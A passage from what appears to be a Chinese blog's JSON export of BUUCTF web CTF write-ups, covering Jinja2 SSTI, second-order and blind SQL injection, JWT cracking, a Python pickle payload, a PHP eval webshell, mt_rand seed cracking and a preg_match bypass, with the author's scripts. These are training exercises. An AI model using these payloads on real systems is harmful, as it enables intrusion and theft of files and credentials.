卸载xinetd\n\n\n\n\n\n\n\n","categories":["Linux"],"tags":["Linux"]},{"title":"BUUCTF-WEB 【CSCCTF 2019 Qual】FlaskLight 1","url":"/2021/08/16/%5BCSCCTF%202019%20Qual%5DFlaskLight%201/","content":"考点jinja2的ssti注入\n解题过程打开\n在源代码中\n\n通过下面payload判断是否存在模板注入\n?search=&#123;&#123;4*4&#125;&#125;\n\n\n确定漏洞类型存在模板注入\n试了常规的命令执行payload，发现都是返回500服务器错误。\n&#123;&#123;&apos;&apos;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&apos;__builtins__&apos;][&apos;eval&apos;](&quot;__import__(&apos;os&apos;).popen(&apos;ls&apos;).read()&quot;)&#125;&#125;\n\n&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;  &#123;% if c.__name__ == &apos;catch_warnings&apos; %&#125;    &#123;% for b in c.__init__.__globals__.values() %&#125;      &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125;    \t &#123;% if &apos;eval&apos; in b.keys() %&#125;      \t &#123;&#123; b[&apos;eval&apos;](&apos;__import__(&quot;os&quot;).popen(&quot;id&quot;).read()&apos;) &#125;&#125;   \t   &#123;% endif %&#125;  \t&#123;% endif %&#125;   &#123;% endfor %&#125;  &#123;% endif %&#125;&#123;% endfor %&#125;\n\n\n\n无奈之下，找到一名大师傅写的脚本\nimport requestsimport reimport htmlimport timeindex = 0for i in range(170, 1000):    try:        url = \"http://d08b15b4-f7c1-4129-9083-3fc9d50a2c5f.node4.buuoj.cn:81?search=&#123;&#123;''.__class__.__mro__[2].__subclasses__()[\" + str(i) + \"]&#125;&#125;\"        r = requests.get(url)        res = re.findall(\"&lt;h2&gt;You searched for:&lt;\\/h2&gt;\\W+&lt;h3&gt;(.*)&lt;\\/h3&gt;\", r.text)        time.sleep(0.1)        # print(res)        # print(r.text)        res = html.unescape(res[0])        print(str(i) + \" | \" + res)        if \"subprocess.Popen\" in res:            index = i            break    except:        continueprint(\"indexo of subprocess.Popen:\" + str(index))\n\n这个脚本的功能是查找可以执行命令的类，查找条件subprocess.Popen。\n\n接下来通过大师傅给的payload\n?search=&#123;&#123;''.__class__.__mro__[2].__subclasses__()[258]('ls',shell=True,stdout=-1).communicate()[0].strip()&#125;&#125;?search=&#123;&#123;''.__class__.__mro__[2].__subclasses__()[258]('ls /flasklight',shell=True,stdout=-1).communicate()[0].strip()&#125;&#125;?search=&#123;&#123;''.__class__.__mro__[2].__subclasses__()[258]('cat /flasklight/coomme_geeeett_youur_flek',shell=True,stdout=-1).communicate()[0].strip()&#125;&#125;\n\n\n成功打通。\n总结对模板注入还不够了解，不会构造payload，更不会bypass，只能拿着别人的payload或者工具来做题，这类题得多做，payload要会自己构造。\n","categories":["CTF","BUUCTF"],"tags":["CTF","SSTI(jinja2)"]},{"title":"BUUCTF-WEB 【CISCN2019 华北赛区 Day1 Web5】CyberPunk 1","url":"/2021/05/11/%5BCISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day1%20Web5%5DCyberPunk%201/","content":"考点：文件包含、二次注入、sql注入读取文件这道题本来打算自己折腾出来的，把源代码包含出来后，一直审计，起初，根本没发现是二次注入，一直在想办法绕过addslashes  和 怎么绕过正则，正则过滤了很多sql注入的关键字，只能检测有sql注入漏洞，但根本不可能查到数据。就是在这上面下的功夫比较多。最后才发现，文件change.php 有一个查询sql语句，带入查询的sql语句关键字被过滤了，在查询出来的基础上，紧接着有一条更新语句，更新语句是有一个条件是从数据库中取出，也就是$row[&#39;address&#39;] ，然后找到这个$row[&#39;address&#39;] 插入的地方，也就是首页index.php ，后台处理是 confirm.php， 发现没有处理 $address，于是就知道这个题考的二次注入。知道以后，可以查询表名，字段名，就是查不到字段值，网上找个了遍，群里也问了哪些大佬，都没有得到结果，最后才看来wp，发现flag根本不在数据库中，而是在 /falg.txt 中，简直人傻了。\n分析主页上一个关键的地方，可以用文件包含出几个文件的源代码。\n\npayload\n?file=php://filter/read=convert.base64-encode/resource=index.php\n\nconfirm.php\n&lt;?phprequire_once &quot;config.php&quot;;//var_dump($_POST);if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;address&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;]))&#123;    $msg = &apos;&apos;;    $pattern = &apos;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&apos;;    $user_name = $_POST[&quot;user_name&quot;];    # 这里接收address     $address = $_POST[&quot;address&quot;];    $phone = $_POST[&quot;phone&quot;];    #     if (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123;        $msg = &apos;no sql inject!&apos;;    &#125;else&#123;        $sql = &quot;select * from `user` where `user_name`=&apos;&#123;$user_name&#125;&apos; and `phone`=&apos;&#123;$phone&#125;&apos;&quot;;        $fetch = $db-&gt;query($sql);    &#125;    if($fetch-&gt;num_rows&gt;0) &#123;        $msg = $user_name.&quot;å·²æäº¤è®¢å&quot;;    &#125;else&#123;        # 这里会将address 插入到数据库中         # 这里使用了预处理 不存在sql注入        $sql = &quot;insert into `user` ( `user_name`, `address`, `phone`) values( ?, ?, ?)&quot;;        $re = $db-&gt;prepare($sql);        $re-&gt;bind_param(&quot;sss&quot;, $user_name, $address, $phone);        $re = $re-&gt;execute();        if(!$re) &#123;            echo &apos;error&apos;;            print_r($db-&gt;error);            exit;        &#125;        $msg = &quot;è®¢åæäº¤æå&quot;;    &#125;&#125; else &#123;    $msg = &quot;ä¿¡æ¯ä¸å¨&quot;;&#125;?&gt;\n\nchange.php\n&lt;?phprequire_once &quot;config.php&quot;;if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;address&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;]))&#123;    $msg = &apos;&apos;;    $pattern = &apos;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&apos;;    $user_name = $_POST[&quot;user_name&quot;];    # 这里会接收 address 参数 特殊字符会被addslashes 转义    $address = addslashes($_POST[&quot;address&quot;]);    $phone = $_POST[&quot;phone&quot;];    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123;        $msg = &apos;no sql inject!&apos;;    &#125;else&#123;        $sql = &quot;select * from `user` where `user_name`=&apos;&#123;$user_name&#125;&apos; and `phone`=&apos;&#123;$phone&#125;&apos;&quot;;        $fetch = $db-&gt;query($sql);    &#125;    if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0)&#123;        $row = $fetch-&gt;fetch_assoc();        # 这里会把刚接收的 address 更新 到 address 字段中         # 会把查询出来的address 更新到 old_address 字段中        # 这里传入的 address 已经被 addslashes 构造不了 单引号闭合        # 而这里的 $row[&apos;address&apos;] 是从数据库中取出         # 而刚刚的confirm.php文件并没有处理address 参数       \t# 这里会存在二次注入        $sql = &quot;update `user` set `address`=&apos;&quot;.$address.&quot;&apos;, `old_address`=&apos;&quot;.$row[&apos;address&apos;].&quot;&apos; where `user_id`=&quot;.$row[&apos;user_id&apos;];        $result = $db-&gt;query($sql);        if(!$result) &#123;            echo &apos;error&apos;;            print_r($db-&gt;error);            exit;        &#125;        $msg = &quot;è®¢åä¿®æ¹æå&quot;;    &#125; else &#123;        $msg = &quot;æªæ¾å°è®¢å!&quot;;    &#125;&#125;else &#123;    $msg = &quot;ä¿¡æ¯ä¸å¨&quot;;&#125;?&gt;\n\n贴了两个关键文件的代码，总共有四个功能提交订单 查询订单 修改订单 删除订单\n漏洞出现在提交订单 和 修改订单当中，直接构造payload。\npayload\n查数据库\naa' or updatexml(2,concat(0x7e,(database())),0) or'\n\n加载flag文件\naa' or updatexml(2,concat(0x7e,(select load_file('/flag.txt'))),0) or'\n\n读不完\n一次\n# 一次aa' or updatexml(2,concat(0x7e,(select substr(load_file('/flag.txt'),10,40))),0) or'# 两次aa' or updatexml(2,concat(0x7e,(select substr(load_file('/flag.txt'),20,50))),0) or'\n\n测试把查数据库的payload提交上去\n\n再修改订单信息\n\n成功的拿到了数据库名\n\n接下来直接读flag，为什么不是放在数据库中，我也是不断的读取字段名，读了差不多20多个字段名，一直读不完，才去看别人wp，发现要用load_file 去读 /flag.txt 文件。\n提交\n\n修改\n\n拿到flag，但是并没有全拿到。\n\n再读一次，就拿到后半段。\naa' or updatexml(2,concat(0x7e,(select substr(load_file('/flag.txt'),20,50))),0) or'\n\n\nupdate 注入：https://wooyun.js.org/drops/%E5%88%A9%E7%94%A8insert%EF%BC%8Cupdate%E5%92%8Cdelete%E6%B3%A8%E5%85%A5%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE.html\n","categories":["CTF","BUUCTF"],"tags":["CTF","文件包含","二次注入"]},{"title":"BUUCTF-WEB 【CISCN2019 华北赛区 Day1 Web2】ikun 1","url":"/2021/04/29/%5BCISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day1%20Web2%5Dikun%201/","content":"考点：JWT伪造爆破页面爆破页面的方式查找lv6.png\nimport requestsfor i in range(1,500):    url = \"http://c3b3fa1b-d3f7-46e3-87aa-cd780610904c.node3.buuoj.cn/shop?page=%d\"%(i)    resp = requests.get(url, timeout=10)    if \"lv6.png\" in resp.text:        print(\"[+]\" + str(i))        break    print(i)# page=181 找到\n\nJWT伪造要伪造JWT，首先要知道密钥，通过工具  jwt-cracker\n下载连接：https://github.com/brendan-rius/c-jwt-cracker\n└─$ ./jwtcrack &quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3QifQ.l0qG4XbJbemqJXsaITaT8g78fkJ-boRvU2H7H1CY644&quot;Secret is &quot;1Kun&quot;\n\n打开 https://jwt.io/\n\npython反序列化序列化构建payload\nimport pickleimport urllibclass payload(object):    def __reduce__(self):        return (eval, (\"open('/flag.txt', 'r').read()\",))    a = pickle.dumps(payload())a = urllib.quote(a)print a\n\nc__builtin__%0Aeval%0Ap0%0A%28S%22open%28%27/flag.txt%27%2C%20%27r%27%29.read%28%29%22%0Ap1%0Atp2%0ARp3%0A.\n\n这道题，在没看wp之前，我以为是需要用1000块钱把所有的商品买光，把资金筹集够，然后会有相应提示或者输出flag。在优惠折扣那存在一个漏洞，可以修改值大小。修改得越小，花的钱就越少，就通过burp suite 得 intruder 购买了所有商品，结果发现还是回显什么。总之，这道题很多知识点都超出了我的认知。\n","categories":["CTF","BUUCTF"],"tags":["CTF","反序列化(Python)","JWT伪造"]},{"title":"BUUCTF-WEB 【CISCN2019 总决赛 Day2 Web1】Easyweb 1","url":"/2021/04/25/%5BCISCN2019%20%E6%80%BB%E5%86%B3%E8%B5%9B%20Day2%20Web1%5DEasyweb%201/","content":"考点：备份文件泄漏、sql盲注、绕过php字符文件上传打开\n一个普普通通的登录框，查看源代码，图片是通过请求 image.php?id=1 的方式得到的。测试了下，好像只会显示图片和不显示图片，只要发现有登录框的题，都会测试sql注入，和扫目录。sql注入，没有明显报错，扫描目录的结果如下。\n\n发现 robots.txt image.php.bak 关键信息\n打开 robots.txt\n\n关键信息 *.php.bak\n下载 image.php.bak 得到一份image.php 的源码\n&lt;﻿?phpinclude \"config.php\";$id=isset($_GET[\"id\"])?$_GET[\"id\"]:\"1\";$path=isset($_GET[\"path\"])?$_GET[\"path\"]:\"\";# addslashes$id=addslashes($id);$path=addslashes($path);# 一般 addslashes 和 str_replace 放在一起 有可能照成 某些字符逃逸# str_replace 将 字符串中带有 \\0 %00 \\' \\ 替换成 '$id=str_replace(array(\"\\\\0\",\"%00\",\"\\\\'\",\"'\"),\"\",$id);$path=str_replace(array(\"\\\\0\",\"%00\",\"\\\\'\",\"'\"),\"\",$path);$result=mysqli_query($con,\"select * from images where id='&#123;$id&#125;' or path='&#123;$path&#125;'\");$row=mysqli_fetch_array($result,MYSQLI_ASSOC);$path=\"./\" . $row[\"path\"];header(\"Content-Type: image/jpeg\");readfile($path);\n\n简化代码\n&lt;?php    $id = $_GET['code']; //\\0'    echo $id;    echo \"&lt;br/&gt;\";    $id = addslashes($id); // \\\\0\\'    echo \"addslashes:\".$id;    # \\0 为结束符 空字符 \\ ' 替换成 ''    $id = str_replace(array(\"\\\\0\", \"%00\", \"\\\\'\", \"'\"), \"\", $id);    echo '&lt;br/&gt;';    echo $id;\n\n// $code=&apos;&apos;addslashes:\\&apos;// $code=\\0addslashes:\\\\0\\\n\n当我输入 \\0 ，addslashes函数会将 \\0 转换成 \\\\0 ， 在经过str_replace的替换 ，就会逃逸出一个\\。这个斜杠会照成什么危害呢，接下来把这个\\ 拼接到sql语句中。\n# $result=mysqli_query($con,\"select * from images where id='&#123;$id&#125;' or path='&#123;$path&#125;'\");$row=mysqli_fetch_array($result,MYSQLI_ASSOC);# 拼接逃逸的 \\ 后 $result=mysqli_query($con,\"select * from images where id='\\' or path='&#123;$path&#125;'\");\n\n 可以看到 &quot;select * from images where id=&#39;\\&#39; or path=&#39;{$path}&#39;&quot; 中的 &#39; 被转义 成了 \\&#39;，id的值就变成了 \\&#39; or path= ，后面的  $path 可控。\n直接构建payload\n?id=\\0&amp;path= or 1=1 --+\n\n完整的sql查询语句\nselect * from images where id='\\' or path=' or 1=1 --+'\n\nid值成了 \\&#39; or path=  可控部分为  or 1=1 --+  --+ 注释掉了后面单引号。\n需要注意的地方是 or 前边需要留一个空格，不然会挨在id值后面，导致语法失效。\n接下来进行利用\nsql盲注构建payload\n# 查表名or (ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),1,1))=%s)--+[+] image,users# 查列名or (ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=0x7573657273)),1,1))=%s)--+# 0x7573657273 是 字符串转16进制的 users 因为过滤了 ' [+] username,password# 查值\n\n上脚本\nimport requestsurl='http://d8d00e0d-6636-4e83-a4fb-fb6078f71755.node3.buuoj.cn/image.php?id=\\\\0&amp;path='flag=''for i in range(50):    a = 32    b = 128    mid = (a+b)//2    while(a&lt;b):                 # or (ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),%d,1))&gt;%s)--+  爆表名                  # or (ascii(substr((select(group_concat(column_name)))from(information_schema.columns)where(table_name=0x7573657273)),%d,1))&gt;%s)--+ 爆列名        # print(mid)        payload = url+\"or (ascii(substr((select(group_concat(username,password))from(users)),%d,1))&gt;%s)--+\"%(i,mid)        import time        time.sleep(1)        re = requests.get(url=payload)        # 首先判断目标值 是否小于         if 'JFIF' in re.text:            a = mid + 1        else:            # 目标值 大于 则直接 将 mid 赋值给 b            b = mid        mid = (a+b)//2    #     if (mid==32|mid==128):        break    flag +=chr(mid)    print(\"[+] \" + flag)\n\n还是别人写的脚本优雅，自己写的要提交两次。\n结果\n\n用户名 admin  密码 abd0ad13f4eed251de2c\n登录\n\n绕过php字符文件上传，文件名写马经过几经尝试，可以上传除php以外的文件，就是传入的文件名和后缀中不能存在 php，上传后不会给上传到的文件路径，但是会回显下边这样的一个记录。\n\n打开\n\n这个文件记录了上传的文件名。\n那么思路就是，通过修改上传文件的文件名为一句话木马，然后访问这个文件进行利用，这里的文件名不能存在 php 字样，用php短标签代替。\n一个小知识 PHP开启short_open_tag=on，即可使用短标签\npayload \n&lt;=eval($_POST['cmd']);?&gt;\n\n\n访问\n\n","categories":["CTF","BUUCTF"],"tags":["CTF","备份文件泄露","SQL盲注","文件上传"]},{"title":"BUUCTF-WEB 【GWCTF 2019】枯燥的抽奖 1","url":"/2021/04/21/%5BGWCTF%202019%5D%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96%201/","content":"考点：PHP伪随机数的破解打开\n以为是爆破后面10位密码，用bp提交了下，发现好像回显有代码，找到后发现被隐藏了，解开得到下面。\n&lt;?php#这不是抽奖程序的源代码！不许看！header(\"Content-Type: text/html;charset=utf-8\");session_start();if(!isset($_SESSION['seed']))&#123;$_SESSION['seed']=rand(0,999999999);&#125;mt_srand($_SESSION['seed']);$str_long1 = \"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ\";$str='';$len1=20;# 生成20位字符串for ( $i = 0; $i &lt; $len1; $i++ )&#123;    # 在 $str_long1 中 随机截取 0-61 中的一个     $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);       &#125;# 显示生成的前10位$str_show = substr($str, 0, 10);echo \"&lt;p id='p1'&gt;\".$str_show.\"&lt;/p&gt;\";if(isset($_POST['num']))&#123;    if($_POST['num']===$str)&#123;x        echo \"&lt;p id=flag&gt;抽奖，就是那么枯燥且无味，给你flag&#123;xxxxxxxxx&#125;&lt;/p&gt;\";    &#125;    else&#123;        echo \"&lt;p id=flag&gt;没抽中哦，再试试吧&lt;/p&gt;\";    &#125;&#125;show_source(\"check.php\");\n\n这道题，在我去搜索mt_rand函数的用法的时候，搜索到一些信息。mt_rand是用来生成随机数的，但是如果mt_srand()函数的seep参数被固定后，mt_rand函数生成的随机数，就会有迹可循。\n$str_long1 = \"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ\";$str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);\n\n这句代码的意思是 随机截取一个字符串，在$str_long1这个字符串当中，但是我们如果需要爆破的话，需要找到截取到的字符串对应的下位置，因为这个位置就是mt_rand生成的随机数。\n根据对应的字符串 来生成对应的  数字\n假设 这个字符串为VbjzN5cCrb\nstr1='abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'str2='VbjzN5cCrb'str3 = str1[::-1]length = len(str2)res=''for i in range(len(str2)):      for j in range(len(str1)):        if str2[i] == str1[j]:            res+=str(j)+' '+str(j)+' '+'0'+' '+str(len(str1)-1)+' '            breakprint(res)// 就会转换成这样 // 57 57 0 61 1 1 0 61 9 9 0 61 25 25 0 61 49 49 0 61 31 31 0 61 60 60 0 61 24 24 0 61 45 45 0 61 61 61 0 61\n\n再用php_mt_seed工具进行爆破\n┌──(kali㉿kali)-[~/Downloads/php_mt_seed-4.0]└─$ ./php_mt_seed 57 57 0 61 1 1 0 61 9 9 0 61 25 25 0 61 49 49 0 61 31 31 0 61 60 60 0 61 24 24 0 61 45 45 0 61 61 61 0 61Pattern: EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62Version: 3.0.7 to 5.2.0Found 0, trying 0xfc000000 - 0xffffffff, speed 443.2 Mseeds/s Version: 5.2.1+Found 0, trying 0xfe000000 - 0xffffffff, speed 21.3 Mseeds/s Found 0# 没跑出来\n\n用php_mt_seed破解出来的seed值，再重新来生成完整的20位字符串。\n&lt;?php# 用了个值代替mt_srand(67413330);$str_long1 = \"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ\";$str = '';$len1 = 20;for ($i = 0; $i &lt; $len1; $i++) &#123;    # 组成规则    # 从 $str_long1 字符串中 截取    $str .= substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);&#125;echo $str;\n\n写了大致的解题过程，文本对不上，因为这个工具太不靠谱了，试了好几次，都解不出来。\n","categories":["CTF","BUUCTF"],"tags":["代码审计","CTF","PHP伪随机数的破解"]},{"title":"BUUCTF-WEB 【FBCTF2019】RCEService 1","url":"/2021/04/24/%5BFBCTF2019%5DRCEService%201/","content":"考点：正则PCRE回溯匹配绕过、换行绕过打开\n&lt;?php# 设置当前php文件运行的环境变量putenv('PATH=/home/rceservice/jail');if (isset($_REQUEST['cmd'])) &#123;  $json = $_REQUEST['cmd'];  if (!is_string($json)) &#123;    echo 'Hacking attempt detected&lt;br/&gt;&lt;br/&gt;';  &#125; elseif (preg_match('/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\\x00-\\x1FA-Z0-9!#-\\/;-@\\[-`|~\\x7F]+).*$/', $json)) &#123;    echo 'Hacking attempt detected&lt;br/&gt;&lt;br/&gt;';  &#125; else &#123;    echo 'Attempting to run command:&lt;br/&gt;';    $cmd = json_decode($json, true)['cmd'];    if ($cmd !== NULL) &#123;      system($cmd);    &#125; else &#123;      echo 'Invalid input';    &#125;    echo '&lt;br/&gt;&lt;br/&gt;';  &#125;&#125;?&gt;\n\n这道题有些问题，源码是从别人wp来的，但是别人也没说源码怎么来的。\n不管怎么样，这道题学到了绕过preg_match正则匹配的两种方式。\n第一种方式\n PCRE回溯绕过\np神讲得很好https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html\n这里直接贴脚本\nimport requestsurl  = \"http://3f0c0ea0-47c8-4ae8-8f1c-dcd5c21ec12d.node3.buuoj.cn\"payload = '&#123;\"cmd\": \"/bin/cat /home/rceservice/flag\", \"zz\": \"'+\"a\"*(1000000)+'\"&#125;'res = requests.post(url, data=&#123;\"cmd\": payload&#125;, timeout=10)print(res.text)\n\n\n第二种方式\n换行绕过\npayload\nPOST：cmd=&#123;%0a&quot;cmd&quot;%3a+&quot;/bin/cat+/home/rceservice/flag&quot;%0a&#125;\n\n\n这道题处于懵懂状态。\n","categories":["CTF","BUUCTF"],"tags":["代码审计","CTF","preg_match绕过"]},{"title":"BUUCTF-WEB [GXYCTF2019]StrongestMind 1","url":"/2021/11/07/%5BGXYCTF2019%5DStrongestMind%201/","content":"考点python脚本编写\n解题过程打开\n\n解题脚本\nimport requestsimport reurl = \"http://89e87348-52e7-4e85-89b4-a42b94b8d0ac.node4.buuoj.cn:81/index.php\"req = requests.session()res = req.get(url)# print(res.text)for i in range(1010):    import time    time.sleep(0.1)    res2 = re.findall(r'¦&lt;br&gt;&lt;br&gt;(.+?)&lt;br&gt;', res.text)[0]    res = req.post(url, data=&#123;\"answer\": eval(res2)&#125;)    print(res.text)\n\n","categories":["CTF","BUUCTF"],"tags":["CTF","python脚本编写"]},{"title":"BUUCTF-WEB 【CISCN2019 华北赛区 Day1 Web1】Dropbox 1","url":"/2021/04/21/%5BCISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day1%20Web1%5DDropbox%201/","content":"考点：文件下载、反序列化题：使用利用phar://在file_get_contents读取文件这个题照着别人wp做下来，还是有很多地方不懂，有点害怕审计代码，一连好几个文件，看来看去的，也看不太懂，很懵的感觉。这道题的后端操作，都抽象成了三个大类，保存在class.php文件中，在index.html、login.php这些页面，基本上就是包含了class.php 文件，很多操作就直接调用类方法，代码审计弱鸡的我自然看起来就费劲，不管怎样，还是总结下做题的流程。\n分析经过注册、登录，上传文件。直接来第一个关键的地方。\n\n\n\n经过一番操作后，发现存在文件下载漏洞，在点击下载功能后，进行抓包，会得到文件的内容，这里对index.php 进行了尝试，也直接得到了index.php 的源代码。\n至于这里为什么要加 ../../ 两个回退。是因为在别人的wp中看到。\n\n接下来，开始读取相关文件的源代码进行代码审计。\n\n读取了6个文件的源代码，index.php 显示上传的文件，register.php 注册用户，login.php 登录，upload.php 文件上传，download.php 文件下载，delete.php 文件删除，class.php 为 基类，提供了三个大类，User、FileList、File 。其他的文件都是调用 class.php 里的方法，相当于把所有的方法都放在了class.php 的类中。\n接下来贴几个关键的代码。\nupload.php\nsession_start();if (!isset($_SESSION['login'])) &#123;    header(\"Location: login.php\");    die();&#125;include \"class.php\";if (isset($_FILES[\"file\"])) &#123;    $filename = $_FILES[\"file\"][\"name\"];    $pos = strrpos($filename, \".\");    if ($pos !== false) &#123;        $filename = substr($filename, 0, $pos);    &#125;        $fileext = \".gif\";    switch ($_FILES[\"file\"][\"type\"]) &#123;        case 'image/gif':            $fileext = \".gif\";            break;        case 'image/jpeg':            $fileext = \".jpg\";            break;        case 'image/png':            $fileext = \".png\";            break;        default:            $response = array(\"success\" =&gt; false, \"error\" =&gt; \"Only gif/jpg/png allowed\");            Header(\"Content-type: application/json\");            echo json_encode($response);            die();    &#125;    if (strlen($filename) &lt; 40 &amp;&amp; strlen($filename) !== 0) &#123;        $dst = $_SESSION['sandbox'] . $filename . $fileext;        move_uploaded_file($_FILES[\"file\"][\"tmp_name\"], $dst);        $response = array(\"success\" =&gt; true, \"error\" =&gt; \"\");        Header(\"Content-type: application/json\");        echo json_encode($response);    &#125; else &#123;        $response = array(\"success\" =&gt; false, \"error\" =&gt; \"Invaild filename\");        Header(\"Content-type: application/json\");        echo json_encode($response);    &#125;&#125;?&gt;\n\ndownload.php\n&lt;?phpsession_start();if (!isset($_SESSION['login'])) &#123;    header(\"Location: login.php\");    die();&#125;if (!isset($_POST['filename'])) &#123;    die();&#125;include \"class.php\";ini_set(\"open_basedir\", getcwd() . \":/etc:/tmp\"); // 值chdir($_SESSION['sandbox']);$file = new File();$filename = (string) $_POST['filename'];if (strlen($filename) &lt; 40 &amp;&amp; $file-&gt;open($filename) &amp;&amp; stristr($filename, \"flag\") === false) &#123;    Header(\"Content-type: application/octet-stream\");    Header(\"Content-Disposition: attachment; filename=\" . basename($filename));    echo $file-&gt;close();&#125; else &#123;    echo \"File not exist\";&#125;?&gt;\n\ndelete.php\n&lt;?phpsession_start();if (!isset($_SESSION['login'])) &#123;    header(\"Location: login.php\");    die();&#125;if (!isset($_POST['filename'])) &#123;    die();&#125;include \"class.php\";chdir($_SESSION['sandbox']);$file = new File();$filename = (string) $_POST['filename'];if (strlen($filename) &lt; 40 &amp;&amp; $file-&gt;open($filename)) &#123;    $file-&gt;detele();    Header(\"Content-type: application/json\");    $response = array(\"success\" =&gt; true, \"error\" =&gt; \"\");    echo json_encode($response);&#125; else &#123;    Header(\"Content-type: application/json\");    $response = array(\"success\" =&gt; false, \"error\" =&gt; \"File not exist\");    echo json_encode($response);&#125;?&gt;\n\n最核心的 class.php\n&lt;?phperror_reporting(0);$dbaddr = \"127.0.0.1\";$dbuser = \"root\";$dbpass = \"root\";$dbname = \"dropbox\";$db = new mysqli($dbaddr, $dbuser, $dbpass, $dbname);class User &#123;    public $db;    public function __construct() &#123;        global $db;        $this-&gt;db = $db;    &#125;    public function user_exist($username) &#123;        $stmt = $this-&gt;db-&gt;prepare(\"SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;\");        $stmt-&gt;bind_param(\"s\", $username);        $stmt-&gt;execute();        $stmt-&gt;store_result();        $count = $stmt-&gt;num_rows;        if ($count === 0) &#123;            return false;        &#125;        return true;    &#125;    public function add_user($username, $password) &#123;        if ($this-&gt;user_exist($username)) &#123;            return false;        &#125;        $password = sha1($password . \"SiAchGHmFx\");        $stmt = $this-&gt;db-&gt;prepare(\"INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);\");        $stmt-&gt;bind_param(\"ss\", $username, $password);        $stmt-&gt;execute();        return true;    &#125;    public function verify_user($username, $password) &#123;        if (!$this-&gt;user_exist($username)) &#123;            return false;        &#125;        $password = sha1($password . \"SiAchGHmFx\");        $stmt = $this-&gt;db-&gt;prepare(\"SELECT `password` FROM `users` WHERE `username` = ?;\");        $stmt-&gt;bind_param(\"s\", $username);        $stmt-&gt;execute();        $stmt-&gt;bind_result($expect);        $stmt-&gt;fetch();        if (isset($expect) &amp;&amp; $expect === $password) &#123;            return true;        &#125;        return false;    &#125;    public function __destruct() &#123;        $this-&gt;db-&gt;close();    &#125;&#125;class FileList &#123;    private $files;    private $results;    private $funcs;    public function __construct($path) &#123;        $this-&gt;files = array();        $this-&gt;results = array();        $this-&gt;funcs = array();        $filenames = scandir($path);        $key = array_search(\".\", $filenames);        unset($filenames[$key]);        $key = array_search(\"..\", $filenames);        unset($filenames[$key]);        foreach ($filenames as $filename) &#123;            $file = new File();            $file-&gt;open($path . $filename);            array_push($this-&gt;files, $file);            $this-&gt;results[$file-&gt;name()] = array();        &#125;    &#125;    public function __call($func, $args) &#123;        array_push($this-&gt;funcs, $func);        foreach ($this-&gt;files as $file) &#123;            $this-&gt;results[$file-&gt;name()][$func] = $file-&gt;$func();        &#125;    &#125;    public function __destruct() &#123;        $table = '&lt;div id=\"container\" class=\"container\"&gt;&lt;div class=\"table-responsive\"&gt;&lt;table id=\"table\" class=\"table table-bordered table-hover sm-font\"&gt;';        $table .= '&lt;thead&gt;&lt;tr&gt;';        foreach ($this-&gt;funcs as $func) &#123;            $table .= '&lt;th scope=\"col\" class=\"text-center\"&gt;' . htmlentities($func) . '&lt;/th&gt;';        &#125;        $table .= '&lt;th scope=\"col\" class=\"text-center\"&gt;Opt&lt;/th&gt;';        $table .= '&lt;/thead&gt;&lt;tbody&gt;';        foreach ($this-&gt;results as $filename =&gt; $result) &#123;            $table .= '&lt;tr&gt;';            foreach ($result as $func =&gt; $value) &#123;                $table .= '&lt;td class=\"text-center\"&gt;' . htmlentities($value) . '&lt;/td&gt;';            &#125;            $table .= '&lt;td class=\"text-center\" filename=\"' . htmlentities($filename) . '\"&gt;&lt;a href=\"#\" class=\"download\"&gt;下载&lt;/a&gt; / &lt;a href=\"#\" class=\"delete\"&gt;删除&lt;/a&gt;&lt;/td&gt;';            $table .= '&lt;/tr&gt;';        &#125;        echo $table;    &#125;&#125;class File &#123;    public $filename;    public function open($filename) &#123;        $this-&gt;filename = $filename;        if (file_exists($filename) &amp;&amp; !is_dir($filename)) &#123;            return true;        &#125; else &#123;            return false;        &#125;    &#125;    public function name() &#123;        return basename($this-&gt;filename);    &#125;    public function size() &#123;        $size = filesize($this-&gt;filename);        $units = array(' B', ' KB', ' MB', ' GB', ' TB');        for ($i = 0; $size &gt;= 